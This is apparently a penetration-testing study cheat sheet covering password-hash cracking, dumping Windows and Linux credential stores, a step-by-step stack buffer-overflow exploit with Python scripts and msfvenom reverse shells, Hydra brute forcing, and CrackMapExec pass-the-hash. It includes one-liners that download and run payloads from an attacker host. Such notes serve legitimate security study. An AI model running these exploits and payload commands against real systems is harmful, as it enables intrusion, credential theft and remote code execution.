------------------------------------------------------------------------------------------------------------------------------------------------------

### Hashcat

Relational Tools:\
[[#John-The-Ripper]], [[#Hashes-Passwords]], [[#Linux-Hashes]], [[#Windows-Hashes]]

Cracking password hashes using raw gpu support to assist with the password cracking. It is recommended to run the tool in the host OS machine and not in the VM due to the limitations with GPU support inside the VM.\
Hashcat's power lies in utilising the GPU.

> - [Hashcat Identify Hashes through examples](https://hashcat.net/wiki/doku.php?id=example_hashes)
> - **Identify the Hash:** Then using *search* with the first 2-3 characters in search to see if you can match examples
> - **Alternative:** using `hash-identifier` and searching with the hash
> - [OSCP Hashcat cheatsheet](https://hashcat.net/wiki/doku.php?id=hashcat)

**NOTES:**

> - Running these commands from host OS windows, so the commands are as from cmd or powershell.
> - The rule has been downloaded from [One Rule to Rule them All](https://github.com/NotSoSecure/password_cracking_rules)

```powershell
#OPTIONS
a   
```

|                                                                                                       | Description                                                                                                          |
|:----------------------------------------------------------------------------------------------------- |:-------------------------------------------------------------------------------------------------------------------- |
| @ **Hashcat Syntax**                                                                                  | ---                                                                                                                  |
| `.\hashcat.exe -a 0 -m 500 $HASHES $WORDLIST -o $FILE`                                                | using the`rockyou.txt` wordlist to crack `-m 500` signals a `md5` hash, `-a 0` for dictionary                        |
| `.\hashcat.exe -a 0 -m 1000 "1CA1AF967472CB2F876DA47A833DFF94" rockyou.txt`                           | Targeting a specific hash, `-m 1000` to signal windows NTML hashtype, `"ntmlhash"` target hash directly              |
|                                                                                                       |                                                                                                                      |
| @ **Hashcat Syntax**                                                                                  | ---                                                                                                                  |
| `.\hashcat.exe -a 3 -m 500 $HASHES ?1?1?1?1?1?1?1?1 --increment -1 ?l?d?u`                            | Brute force all passwords **length 1-8** with possible characters A-Z a-z 0-9                                        |
|                                                                                                       |                                                                                                                      |
| @ **Show usernames to Hashes matched Syntax**                                                         | ---                                                                                                                  |
| `.\hashcat.exe -m 1800 --username --potfile-path $POTFILE --show -o $FILE --outfile-format=2 .\$FILE` |                                                                                                                      |
|                                                                                                       |                                                                                                                      |
| @ **Options**                                                                                         | ---                                                                                                                  |
| `-m 500`                                                                                              | Select **hash-type** based on code, `500 - md5`, use hashcat examples or `hash-identifier` to find hashtype and code |
| `-a 0`                                                                                                | Select **Attack-Mode**, `0 - straight`, `1 - combo`, `6 - hybrid wordlist & mask`, `7 - hybrid mask & wordlist`      |
| `-o $FILE`                                                                                            | Write to file`-o <filename.txt>`                                                                                     |
| `-r rules\OneRuleToRuleThemAll.rule`                                                                  | specify a specific rule to use with the cracking attempts. This particular rule needs to be downloaded               |
| `--username`                                                                                          | specify that file contains usernames in first lines of file up to : separator                                        |
| `--show`                                                                                              | used to display cracked hashes                                                                                       |
| `--outfile-format=2`                                                                                  | specify the passwords to be just play text                                                                           |
| `--potfile-path`                                                                                      | specify the potfile, contained the cracked passwords to a file that hashcat creates                                  |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Hashes-Passwords

[[#Hashcat]], [[#John-The-Ripper]], [[#Windows-Privilege-Escalation]], [[#Linux-Privilege-Escalation]]

Refer to [Hashcat hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows-Hashes

[[#Hashcat]], [[#John-The-Ripper]], [[#Windows-Privilege-Escalation]]

Grabbing the NTDS.dit and System registry to look for *Windows* hashes. Then using **Impacket** to dump the hashes

|                                                                                                           | Desciption                                              |
| :-------------------------------------------------------------------------------------------------------- | :------------------------------------------------------ |
| @ **Location Path**                                                                                       | ---                                                     |
| `C:\Windows\NTDS\ntds.dit`                                                                                | Active Directory database                               |
| `C:\Windows\System32\config\SYSTEM`                                                                       | Registry hive containing the key used to encrypt hashes |
| @ **Using Impacket to Dump**                                                                              | ---                                                     |
| `impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile ntlm-extract` |
| @ **Cracking using Hashcat**                                                                              | ---                                                     |
| `.\hashcat.exe -a 0 -m 1000 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule`                          | example of sytanx used, refer to hashcat notes          |
| =========================================                                                                 | =========================================               |

**Notes:**

- > Depending on the wordlist and if the password is even in the list, the time it takes to crack could be indefinite so ensuring you don't take up all your time with one focus

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Linux-Hashes

[[#Hashcat]], [[#John-The-Ripper]], [[#Linux-Privilege-Escalation]]

Grabbing the `/etc/passwd` and `/etc/shadow` file for users and password hashes. Then using **Unshadow** to merge the users with their *corresponding* hashes.\
This file is then used to crack each users password.

|                                                                  | Desciption                                                                                                       |
| :--------------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------- |
| @ **Location Path**                                              | ---                                                                                                              |
| `cat /etc/passwd`                                                | to read the **users** on system                                                                                  |
| `sudo cat /etc/shadow`                                           | to read the **password hashes**, requires admin privs to access this file or misconfigured privs                 |
| @ **Unshadow Syntax**                                            | ---                                                                                                              |
| `unshadow <path/to/users.txt> <path/to/hashes> > <new_filename>` | Combining two files, usernames and password hashes                                                               |
| `unshadow /etc/passwd /etc/shadow > hashes`                      | `/etc/passwd` and `/etc/shadow` are common locations to have the usernames and hashes stored in **UNIX systems** |
| =========================================                        | =========================================                                                                        |

**Notes:**

- > Depending on the wordlist and if the password is even in the list, the time it takes to crack could be indefinite so ensuring you don't take up all your time with one focus

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Buffer-Overflow

Taking control of the execution flow of a piece of software or a routine of the operating system. Force the program to behave differently from the intended usage

**Buffer overflow attacks can lead to:**

    - Denial of service by making the program crash
    - Privilege escalation
    - Remote code execution
    - Security feature bypasses

The *buffer* is an area in the RAM reserves for temp data storage such as: user input, parts of a video file, server banners received by a client application etc..

Buffers have limit size and can only contain a set amount of data so if a developed application does not enforce buffer limits' then an attacker could find a way to write data beyond those limits.

This would lead to being exploited and *gaining control over the program **execution** **flow***.

**Example of memory:**

![](https://i.imgur.com/K7nQWy8.png)

**Example of the stack, with buffer overflow into EIP:**

![](https://i.imgur.com/ZgIcZw1.png)

### Seven-Steps-To-Buffer-Overflow:

> - FUZZ the application, send a bunch of data and observe it's behaviour. Does it crash? if so...
> - Use pattern_create and pattern_offset to generate a unique string and allows us to determine where the program is crashing
> - Find out what is being written into the `EIP register`
> - Generate shell code for the exploit (e.g msfvenom)
> - Identify any bad characters: cannot be included in our payload
> - Identify a `JMP ESP` anywhere in the program, that is usable in the exploit (No `DEP Data execution prevention` and No `ASLR address space layout randomisation` as we need a static space for the payload to reliably call on)
> - Overwrite `IEP` with this memory address to jump to our shell code and execute it (**note:** little endian, backwards)
> - **0xc9e45528 to \x28\x55\xe4\xc9** (the inverted structure of normally \xc9\xe4\x55\x28)
> - The memory addresses need to be in the reverse order for buffer overflow

```powershell
#SETUP
    'Load Immunity Debugger'
    'Run with Ctrl + F2 to reload, F9 to run'
    
    !mona config -set workingfolder c:\mona\%p                             : Set working directory to be %P (gets replaced with name of .exe)

#1 FUZZ
    python3 fuzzer.py                                                      :From attacker host, find the limit where program crashes
```

**Step 1 Note:**

> - Crash Limit Bytes (Add 300): 900

```powershell
#2 CRASH & EIP
    $CRASHlimit (add 300)                                                           :Amount data that crashed .exe from 'fuzzer.py' & add 400
    $PAYLOAD                                                                        :From 'pattern_create.rb', get cyclicle characters
    $OFFSET                                                                         :From modified 'exploit.py', default is 0
    $RETN                                                                           :Set the string, default is ""

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $CRASHlimit  :Generate $PAYLOAD
        [Modify] '"exploit.py"  with $PAYLOAD & Run to crash server again'
    
    python3 exploit.py                                                              :From attacker host, crash the .exe

    /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q $EIP

    !mona findmsp -distance $CRASHlimit                                             : Run command to find distance to the string pattern
        [EIP Offset]'Review log data, find $EIP Offset$ = "EIP contains normal pattern : ... (offset $OFFSET)"'
        [Modify]    '"exploit.py" : Set $OFFSET, remove $PAYLOAD, set $RETN "BBBB" & Run to crash server again'
        [Check]     '"EIP register" should be overwritten with 4 Bs (42424242)'
```

![](https://i.imgur.com/vZOvC6r.png)

**Step 2 Note:**

> - EIP Offset:  514
> - **IN EXPLOIT:** Set $OFFSET, remove $PAYLOAD, set $RETN "BBBB" & Run to crash server again

```powershell
#3 BAD CHARS
    $BADCHARS                                           :Bad Chars generated with 'gen_bad_chars.py'
    $bad_char                                           :!mona used to compare memory with our list, we should see the bad chars.

    !mona bytearray -b "\x00"                                                         :Generate bytearray.bin file, exclude the byte '\x00' by default
    
    python3 gen_bad_chars.py                                                          :Generate bad chars
        [Modify]       '"exploit.py": Replace "payload" with $BADCHARS & Run again'   :Take note of 'ESP Register Point'
        
#3a REPEAT by Removing 1 $bad_char at a time UNTIL UNMODIFIED
    !mona compare -f C:\mona\oscp\bytearray.bin -a esp                            :Popup should appear with the comparison for $bad_char

    !mona bytearray -b "\$bad_char"                                               :Move on to modify, Repeat this step until unmodified
        [Modify] '"exploit.py": REMOVING bad chars from "payload"'                :Repeat until "Unmodified" indicating no more bad chars
```

![](https://i.imgur.com/7JTJu6j.png)

**Step 3 Note:**

> - Found: 00

NOTE: Bad chars commonly corrupt the next adjacent character but to be certain so you can test by `removing every 2nd adjacent character` but it is recommended to do 1 char at a time by increasing !mona bytearray by 1 bad character and removing 1 bad character from payload; then compare once again.

> - So the real bad chars: !mona bytearray -b "\x00"

```powershell
#4 JUMP POINT
#  With the program either running or in a crashed state
    $bad_char                           : Other bad chars we found throughout the step 3 process
    $JMPaddress                         : Address will be displayed in log data, 'Note: backwards with \x\x\ notation i.e 625011af = \xaf\x11\x50\x62'

    !mona jmp -r esp -cpb "\$bad_char"                              : Update with full list of bad chars we found.
        [JMP Address] 'From mona, note the $JMPaddress'
        [Modify] '"exploit.py" & update "retn" with the $JMPaddress'  : Found with the above !mona command
```

![](https://i.imgur.com/R64qnBW.png)

**Step 4 Note:**

> - JMP Address: !mona jmp -r esp -cpb "\x00"
> - Address found: 311712F3 
> - JMP Address backwards: \xF3\x12\x17\x31

```powershell
#5 GENERATE PAYLOAD]
    $bad_char              :Other bad chars we found throughout the step 3 process
    $RHOST                 :Attacker listening IP
    $RPORT                 :Attacker listening Port
    $payload               :Msfvenom payload generated '\x01\x02\xa3....\x2a'
    
    msfvenom -p windows/shell_reverse_tcp LHOST=$RHOST LPORT=$RPORT EXITFUNC=thread -b "\$bad_char" -f c
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.19 LPORT=1234 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a"
    msfvenom -p linux/x86/shell_reverse_tcp lhost=10.4.42.21 lport=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
        'Modify "exploit.py" & update "payload" with the msfvenom payload following correct notation format: payload = ($payload)'
```

**Step 5 Note:**

> - Update payload with msfvenom Payload but copy/paste inside parenthesis = (msfvenom code here) due to it not working without it
> - Update padding "\x90" * 32

```powershell
#6 PREPEND NOPS
#  Add space to unpack payload
    'Modify "exploit.py" and update:' padding = "\x90" * 32
    
#7 EXPLOIT
    nc -lvnp 4444      :Setup listener for reverse shell
    ./exploit.py       :Run modified exploit
```

![](https://i.imgur.com/kxQlDi8.png)

---

### Buffer-Overflow-Code

**Step 1: Fuzzer**

Fuzz the app, send a bunch of data and observe behaviour. If it crashes then move to next step

```powershell
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.156.183" # Change IP to VICTIM ip

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

```powershell
#SETUP
    'Load Immunity Debugger'
    'Run with Ctrl + F2 to reload, F9 to run'
    
    !mona config -set workingfolder c:\mona\%p                             : Set working directory to be %P (gets replaced with name of .exe)

#1 FUZZ
    python3 fuzzer.py                                                      :From attacker host, find the limit where program crashes
```


---

**Step 2: Crash and EIP **

Immunity Debugger needs to re-open the program and run again for before we run the 'exploit.py' scripts each time.

```powershell
import socket

ip = "10.10.156.183" # Change IP to VICTIM ip
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

```powershell
#2 CRASH & EIP
    $CRASHlimit (add 400)                                                           :Amount data that crashed .exe from 'fuzzer.py' & add 400
    $PAYLOAD                                                                        :From 'pattern_create.rb', get cyclicle characters
    $OFFSET                                                                         :From modified 'exploit.py', default is 0
    $RETN                                                                           :Set the string, default is ""

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l $CRASHlimit  :Generate $PAYLOAD
        'Modify "exploit.py"  with $PAYLOAD & Run to crash server again'
    
    python3 exploit.py                                                              :From attacker host, crash the .exe

    !mona findmsp -distance $CRASHlimit                                             : Run command to find distance to the string pattern
        'Review log data, find $EIP Offset$ = "EIP contains normal pattern : ... (offset $OFFSET)"'
        'Modify "exploit.py" : Set $OFFSET, remove $PAYLOAD, set $RETN "BBBB" & Run to crash server again'
        'Check: "EIP register" should be overwritten with 4 Bs (42424242)'
```

![](https://i.imgur.com/jG2bpWp.png)

```powershell
#Use Offset to send another exploit
* Modify 'exploit.py' : Set $OFFSET, default $PAYLOAD, set $RETN 'BBBB' & Run to crash server again
EIP register should be overwritten with 4 Bs (42424242)
```

![](https://i.imgur.com/94W4TaT.png)

---

**Step 3: Bad Chars**

The bad chars are all dependent on the system or .exe that is being used and what language it is written in. We want to try to remove the bad chars from the pool however it is dependent on the program.

Using the following we can create a list of bad chars that we will be using to compare:


```powershell
#Bad_Char_generator.py
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

```powershell
#3 BAD CHARS
    $BADCHARS                                           :Bad Chars generated with 'gen_bad_chars.py'
    $ESPaddress                                         :The ESP Register point displayed when running modified 'exploit.py'
    $bad_char                                           :!mona used to compare memory with our list, we should see the bad chars.

    !mona bytearray -b "\x00"                                                         :Generate bytearray.bin file, exclude the byte '\x00' by default
    
    python3 gen_bad_chars.py                                                          :Generate bad chars
        'Modify "exploit.py" & replace "payload" ADDING $BADCHARS & Run again'        :Take note of 'ESP Register Point'
    
#3a REPEAT UNTIL UNMODIFIED
    !mona compare -f C:\mona\oscp\bytearray.bin -a $ESPaddress                        :Popup should appear with the comparison for $bad_char
        'Review bad chars, add to bytearray with;' 

    !mona bytearray -b "\x00\$bad_char"                                               :Move on to modify, Repeat this step until unmodified
        'Modify "exploit.py" & update "payload" by REMOVING bad chars'                :Repeat until "Unmodified" indicating no more bad chars
```

Note:

> - Using `!mona compare -f C:\mona\oscp\bytearray.bin -a $ADDRESS` will produce a popup with comparison between what is in 'memory' and what is in the 'generated bad chars' file that we have.
> - Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.
> - The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.

![](https://i.imgur.com/B6fy37q.png)

---

**Step 4: Jump Point**

With the program either running or in a crashed state, we run the following command. This command finds all 'jmp esp' instructions with addresses that **do not** contain any of the bad chars specified. The results should display in the log data menu

From the jump point, we select and address and update our `exploit.py` setting the `retn` variable to the address **BUT WRITTEN BACKWARDS**. This is due to the system being Little Endian

```powershell
#4 JUMP POINT
#  With the program either running or in a crashed state
    $bad_char                           : Other bad chars we found throughout the step 3 process
    $JMPaddress                         : Address will be displayed in log data, 'Note: backwards with \x\x\ notation i.e 625011af = \xaf\x11\x50\x62'

    !mona jmp -r esp -cpb "\x00\$bad_char"                          : Update with full list of bad chars we found.
        'Modify "exploit.py" & update "retn" with the $JMPaddress'  : Found with the above !mona command
```

**Example: Address = 625011af**

**Note**

> - Reminder that address must be placed in exploit backwards (every 2 letters) with the same \x\x\ notation
> - `625011af` becomes `\xaf\x11\x50\x62`

![](https://i.imgur.com/36Khp04.png)

---

**Step 5: Generate Payload**

Using msfvenom, we will generate a payload that we want to inject. The payload will then be copied over to the `exploit.py` script we have modified so far and we will update the payload in the following notation:

```powershell
#EXAMPLE NOTATION TO FOLLOW
payload = ("\xfc\xbb\xa1\x8a\x96\xa2\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3"
"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5d\x62\x14\xa2\x9d"
...
"\xf7\x04\x44\x8d\x88\xf2\x54\xe4\x8d\xbf\xd2\x15\xfc\xd0\xb6"
"\x19\x53\xd0\x92\x19\x53\x2e\x1d")
```

```powershell
#5 GENERATE PAYLOAD]
    $bad_char              :Other bad chars we found throughout the step 3 process
    $RHOST                 :Attacker listening IP
    $RPORT                 :Attacker listening Port
    $payload               :Msfvenom payload generated '\x01\x02\xa3....\x2a'
    
    msfvenom -p windows/shell_reverse_tcp LHOST=$RHOST LPORT=$RPORT EXITFUNC=thread -b "\x00\$bad_char" -f c
        'Modify "exploit.py" & update "payload" with the msfvenom payload following correct notation format: payload = ($payload)'
```

---

**Step 6 & 7: Prepend NOPS then Exploit**

Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the `padding` variable to a string of 16 or more "No Operation" (\x90) bytes:

```powershell
#6 PREPEND NOPS
#  Add space to unpack payload
    'Modify "exploit.py" and update:' padding = "\x90" * 16
    
#7 EXPLOIT
    nc -lvnp 4444      :Setup listener for reverse shell
    ./exploit.py       :Run modified exploit
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SMTP-Exploitation

Tags: [[#Metasploit]]

Simple Mail Transfer Protocol - exploitation of the e-mail services in order to enumerate and expose sensitive information.

SMTP is normally on Port 25 as default. Enumerating and finding the usernames means we can potentially bruteforce passwords on SSH and such using hydra or likewise.\
Finding usernames will narrow our bruteforcing down significantly and can lead to other attack vectors so testing SMTP ports for this info is good for enumeration.

|                                           | Description                                                         |
| :---------------------------------------- | :----------------------------------------------------------------- |
| @ **Metasploit**                          | ---                                                                |
| `search smtp_version`                     | gather info on the version, system mail name etc                   |
| `search smtp_enum`                        | bruteforce with usernames such as `/usr/share/seclists/Usernames/` |
|                                           |
| @ **Examples**                            | ---                                                                |
| @ **Options**                             | ---                                                                |
| ========================================= | =========================================                          |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# NETWORK-ATTACKS

------------------------------------------------------------------------------------------------------------------------------------------------------

As with *System Attacks*, network attacks still can utilise both Brute Forcing and Dictionary attacks on credentials however it is more common for it to be Dictionary attacks due to the limitations with network attacks.

Unlike offline cracking in system attacks, networks attacks rely on the ping latency, any rules that delay connections or repeated connections as such. So brute forcing is very inefficient in Network attacks and pentesters almost always rely on Dictionaries for the credential cracking.

------------------------------------------------------------------------------------------------------------------------------------------------------

## ROUTING

**Notes:**

> - Interface name: tap0, eth0 or whatever

| Command                                                              | Description                                                                                                               |
|:-------------------------------------------------------------------- |:------------------------------------------------------------------------------------------------------------------------- |
| @ **Display Routing Table**                                          | ---                                                                                                                       |
| `route -n`                                                           | Linux Preferred method                                                                                                    |
| `ip route`                                                           | Linux more info method                                                                                                    |
| `route print`                                                        | Windows                                                                                                                   |
| `netstat -r`                                                         | OSX                                                                                                                       |
|                                                                      |                                                                                                                           |
| @ **Display ARP Cache**                                              | ---                                                                                                                       |
| `ip n` or `ip neighbour`                                             | Check ARP Cache for saved ip & mac address routes, [windows arp-a] [macos arp]                                            |
|                                                                      |                                                                                                                           |
| @ **Add Route**                                                      | ---                                                                                                                       |
| `ip route add <target_ip> via <target_gateway> dev <interface_name>` | adding an ip route                                                                                                        |
| `ip route add 192.168.99.0/24 via 10.175.34.1 dev eth0`              | Add destination for network and set to go through router 10.175.34.1, requires the 0/24 cidr notation and via `<gateway>` |
| `ip route add 192.168.222.0/24 via 10.175.34.1`                      | omitted selecting the interface                                                                                           |
|                                                                      |                                                                                                                           |
| @ **Delete Route**                                                   | ---                                                                                                                       |
| `ip route del <target_ip> via <target_gateway> dev <interface_name>` | same syntax as `add`                                                                                                      |
| `ip route del 192.168.222.0`                                         | shortened version to delete a route                                                                                       |
|                                                                      |                                                                                                                           |
| @ **Add Default Gateway**                                            | ---                                                                                                                       |
| `ip route add default via <new_default_gateway>`                     | syntax ..add default via `new_gateway`, Configuring traffic to flow to a gateway                                          |

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------

## HYDRA

```powershell
#OPTIONS
    $RHOST           :Target IP
    -s $RPORT        :Target port
    -t 30            :Threads set
    -I               :Immediate start, useful for additional attempts
    -V               :Verbosity
    -l $USER         :Username
    -L $FILE         :Username LIST
    -p $PASS         :Pass
    -P $FILE         :Pass LIST
    http-post-form   :Target parameter
    http-get-form    :Target parameter
    -e nsr           :Optional, attempts 'null', 'backwards' username as password
    H= $HEADER:$HEADERcontent
    
#Wordlists
    /usr/share/wordlists/fasttrack.txt
    /usr/share/wordlists/rockyou.txt
    /usr/share/ncrack/minimal.usr

#HTTP-POST-FORM
    hydra -l $USER -P $FILE $RHOST http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30 -I -V

#HTTP-GET
    hydra -e nsr -l $USER -P $FILE $RHOST http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=v4js1i3dkt0jrlcv8lvj238ur5; security=low" -t 30 -I -V
    #GET VERB
    hydra -L $FILE -P $FILE http-get://$RHOST/

#BASIC AUTH
    hydra -e nsr -l $USER -P $FILE $RHOST -s $RPORT http-get /protected -I -V -t 30
    
#PROTOCOLS : ftp, telnet, ssh, http-get
    hydra -L $FILE -P $FILE telnet://$RHOST
    hydra -e nsr -l $USER -P $FILE ssh://$RHOST
```

**BEFORE AUTHENTICATION ATTACKS:**

> - Fine tune the policies and rules to be more successful. Check if you can use **enum** or **enum4linux (preferred)** to find out the password policies
> - If you do, prevents account locking, 
> - prevents false positives, 
> - more configured dictionary or bruteforcing
> - Know the **minimum** and **maximum length** of a password could be important to save time when bruteforcing

**It can attack nearly 50 different services types including:**

> - Cisco Auth
> - FTP
> - HTTP
> - IMAP
> - RDP
> - SMB
> - SSH
> - Telnet

**REMOTE LOGIN:**

> - Check how the website handles the login attempt and how does it send the parameters:
> - We can see the website uses *post* to send the parameters and the value being *login.php*\

![](Obsidian_Xn2a6eR1yE.png)

![](https://i.imgur.com/wGZnfb8.png)

> - Remote login form requires you to find specific details on the web page in order to configure Hydra correctly
> - From browser, burpsuite or zap, find out what *references* the user and password field

![](https://i.imgur.com/MCMA2wP.png)
  
> - in this case, Username = username and Password = password

[Back to Top](#table-of-contents)


------------------------------------------------------------------------------------------------------------------------------------------------------


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SMB-SAMBA-Shares

Tags: [CrackMapExec](#CrackMapExec), [SMBclient](#SMBclient), [Windows-Shares](#Windows-Shares), [Enum4Linux](#Enum4Linux)

**NETBIOS:**

Network-Basic-Input-Output-System

NetBIOS is used when the server and client is viewing the network shares on a LAN\
**Supplying some of the following information when querying a computer:**

> - Hostname
> - NetBIOS name
> - Domain
> - Network Shares

**When an MS Windows Machine browses a network, it uses NetBIOS:**

> - **Datagrams** to list shares and the machines
> - **Names** to find workgroups
> - **Sessions** to transmit data to and from a **Windows Share**

NetBIOS layer sits between *Application* and *IP* layer able to use both TCP and UDP to send datagrams.

**UDP is used for**: NetBIOS name resolution, one-to-many datagram-based communications

  > - Send small messages to many other hosts

**TCP is used for**: NetBIOS sessions

  > - Heavy traffic such as *file copy* relies on TCP using NetBIOS sessions

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

### Windows-Shares

Tags: [[#SMBclient]], [[#SMB-SAMBA-Shares]], [[#Shell-SMB]], [[#CrackMapExec]]

Windows machine can share a file or directory on the network allowing local and remote users access to the resource and possibly *modify it*.\
Users generally can turn of *File and Printer Sharing* **service** and then choosing directories or files to share.
- > Setting permissions on share, reading, writing and modifying permissions

**Public Directory** option allows choosing local or remote users to share with and access the share **but only two options**:

> - Only allow *everyone*
> - Only Disallow *everyone*

Authorised users can access shares by using UNC paths - Universal Naming Convention Paths

**Badly configured shares can lead to:**

> - Information disclosure
> - Unauthorised file access
> - Information leakage used to mount a targeted attack

|                                   | Desciption                                                         |
| :-------------------------------- | :----------------------------------------------------------------- |
| @ **UNC Syntax**                  | ---                                                                |
| `\\serverName\shareName\file.nat` | Access shares by using UNC paths                                   |
| @ **Administrative Shares**       | ---                                                                |
| `\\localhost\C$`                  | Admin to access a volume on local machine, `C$, D$, E$ etc`        |
| `\\localhost\admin$`              | Points to windows installation directory                           |
| `\\localhost\ipc$`                | inter-process communication. Cannot browse it via Windows Explorer |
| @ **Examples**                    | ---                                                                |
| `\\localhost\C$`                  | alternative if working on local host                               |



[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## CrackMapExec

Tags: [KERBEROS](#KERBEROS), [Kerbrute](#Kerbrute), [Kerberos-Roast](#Kerberos-Roast), [Winrm](#Winrm), [Asrep-Roast](#Asrep-Roast), [Evil-Winrm](#Evil-Winrm),\
[SMBclient](#SMBclient), [Enum4Linux](#Enum4Linux), [MSSQL](#MSSQL),

Another tool for enumeration on windows devices and specifically able to target **ldap, ssh, smb, winrm and mssql**
This specific tool is geared towards windows and has **a lot of utilities** with vulnerabilities in windows systems.

```powershell
#CME Options
$OPTION     : smb, winrm, mssql, ldap, ssh
-u '$USER'       :Username
-p '$PASS'       :Password

crackmapexec $OPTION -L   :List all modules specific to $OPTION
```

**SMB EXPLOITING**

```powershell
#OPTIONS
    $RHOST      :Target
    -u ''       :Username
    -p ''       :Password
    $FILE       :Text file with users/passwords
    -x or -X   :Execute command, -x for CMD and -X for powershell
    --rid-brute :$IPC 'MUST BE READABLE'
    --shares
    --users
    --disks
    --pass-pol
    --ndts
    --groups

#USAGE
    crackmapexec smb $RHOST -u '' -p ''                :Null Login
    crackmapexec smb $RHOST -u '' -p '' --shares       :Display Shares
    crackmapexec smb $RHOST -u '' -p '' --rid-brute    :$IPC "MUST BE READABLE" Display usernames with RID bruteforcing (Only works with active directory)
    crackmapexec smb $RHOST -u 'root' -p ''            :Commonly, first user in smb is root for linux and Administrator for windows
    crackmapexec smb $RHOST -u 'guest' -p ''           :Guest, low hanging fruit
    crackmapexec smb $RHOST -u 'Administrator' -p ''   :As above, this is specifically Administrator
    crackmapexec smb $RHOST -u $FILEusers -p $FILEpass :Using FILES
    
    crackmapexec smb $RHOST -u 'Administrator' -p '' -x $whoami   :Able to execute commands if successful and there are misconfigurations
    crackmapexec smb $RHOST -u 'Administrator' -p '' -x 'type /path/flag.txt'

```

**WINRM EXPLOITING:**

Tags: [Winrm](#Winrm) - See attached tag for updated info.

Once you have successful username/passwords/hash that you want to attempt to use, you can confirm access with admin privileges and even attempt to run some commands

**NOTES:**

> `winrm` is windows remote manager and is usually only available to be used with admin privileges; sometimes services or higher priv users have access to this as well so it is worth trying


```powershell
#OPTIONS
    $HASH      :able to pass the hash directly instead of cracking it
    -u ''      :Username i.e Administrator commonly winrm is default only admin
    -p ''      :Password
    -d $DOMAIN :specify the domain i.e company.local
    -x or -X   :Execute command, -x for CMD and -X for powershell

#USAGE
    crackmapexec winrm $RHOST -u '' -p ''              :Null Login, commonly winrm is default only admin (but possible for other users to sometimes have privs)
    crackmapexec winrm $RHOST -u '' -p '' -x whoami    :Null login, execute command 'whoami'
    cme winrm $RHOST -u '' -H $HASH -d $DOMAIN -X 'Invoke-WebRequest "http://$LHOST:LPORT/$PAYLOAD.exe" -OutFile "$PAYLOAD1.exe" && cmd /c $PAYLOAD1.exe'  :Download payload & execute
    cme winrm $RHOST -u '' -H $HASH -d $DOMAIN -x 'Certutil -urlcache -f http://$LHOST:LPORT/$PAYLOAD.exe $PAYLOAD1.exe && cmd /c $PAYLOAD1.exe'           :Download payload & execute
```

**EVIL-WINRM**

Tags: [Evil-Winrm](#Evil-Winrm)

Following the link leads to more in-depth information when using Evil-Winrm

```powershell
$HASH     :able to pass the hash directly instead of cracking it
-i $RHOST :Target IP
-u '$USER'     :Username
-p '$PASS'     :Password

evil-winrm -i $RHOST -u '' -p ''     : Login
evil-winrm -u '' -H $HASH -i $RHOST  :Pass hash
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## SMBclient 

Tags: [SMB-SAMBA-Shares](#SMB-SAMBA-Shares), [Shell-SMB](#Shell-SMB), [CrackMapExec](#CrackMapExec), [Enum4Linux](#Enum4Linux), [Windows-Shares](#Windows-Shares)

When targeting netBIOS, which runs by default on *port 137, 138, 139* and smb enumeration. This type of enumeration is **active enumeration** as you are directly interacting with the services of the target.

**NOTES:**

> - works with both forms `//ip/shares` however backslashes require extra `\\\\ip\\shares`

```powershell
#NMAP SCRIPTS
    nmap -script=smb-enum-shares $RHOST
    nmap -script=smb-enum-users $RHOST
    nmap -script=smb-brute $RHOST

#USAGE
